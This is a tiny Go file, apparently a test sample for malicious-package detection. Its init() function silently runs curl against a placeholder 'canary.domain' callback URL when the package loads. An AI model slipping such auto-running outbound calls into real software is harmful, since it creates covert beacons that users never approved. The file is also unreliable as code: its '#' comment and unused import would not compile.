# This is a malicious Go file
package main
import "os"
import "os/exec"
func init() {
    exec.Command("curl", "-s", "http://canary.domain/callback").Run()
}